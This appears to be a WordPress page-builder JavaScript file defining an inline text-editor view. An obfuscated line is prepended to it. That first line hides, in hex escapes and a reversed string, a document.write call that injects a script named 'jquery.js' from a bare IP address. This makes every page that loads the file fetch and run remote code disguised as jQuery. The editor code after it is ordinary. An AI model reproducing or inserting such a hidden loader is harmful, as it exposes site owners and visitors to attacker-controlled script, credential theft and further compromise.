var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))(function ( $ ) {
	window.InlineShortcodeView_vc_column_text = window.InlineShortcodeView.extend( {
		initialize: function ( options ) {
			window.InlineShortcodeView_vc_column_text.__super__.initialize.call( this, options );
			_.bindAll( this, 'setupEditor', 'updateContent' );
		},
		render: function () {
			window.InlineShortcodeView_vc_column_text.__super__.render.call( this );
			// Here
			return this;
		},
		setupEditor: function ( ed ) {
			ed.on( 'keyup', this.updateContent )
		},
		updateContent: function () {
			var params = this.model.get( 'params' );
			params.content = tinyMCE.activeEditor.getContent();
			this.model.save( { params: params }, { silent: true } );
		}
	} );
})( window.jQuery );